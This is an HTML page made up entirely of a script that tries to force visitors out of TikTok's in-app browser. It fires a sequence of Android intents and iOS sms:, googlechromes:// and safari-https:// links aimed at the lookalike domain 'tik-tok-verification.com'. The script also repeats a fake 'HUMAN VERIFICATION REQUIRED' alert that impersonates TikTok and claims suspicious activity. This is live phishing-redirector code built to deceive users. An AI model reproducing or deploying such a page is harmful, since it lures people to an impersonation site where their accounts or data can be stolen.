<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000;

    function theSlingShot() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: We use the 'intent' with the 'Sms' action but targeting Chrome
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE CONTEXT COLLISION
            
            // 1. Trigger SMS. This forces TikTok to "pause" and hand control to the OS.
            window.location.href = "sms:741741&body=" + encodeURIComponent(targetUrl);

            // 2. THE COLLISION: 100ms later, while the OS is pulling up the SMS window,
            // we fire a 'googlechromes' protocol. This forces a kernel decision.
            setTimeout(() => {
                window.location.href = "googlechromes://" + domain;
            }, 100);

            // 3. THE EJECT: Final pulse to Safari
            setTimeout(() => {
                window.location.href = "safari-https://" + domain;
            }, 200);
        }
    }

    function runSystem() {
        if (Date.now() > killTime) return;

        // Start the collision
        theSlingShot();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Trigger on the 'OK' click gesture
                theSlingShot();

                setTimeout(runSystem, 350);
            }
        }, 350);
    }

    window.onload = runSystem;
</script>

</body>
</html>
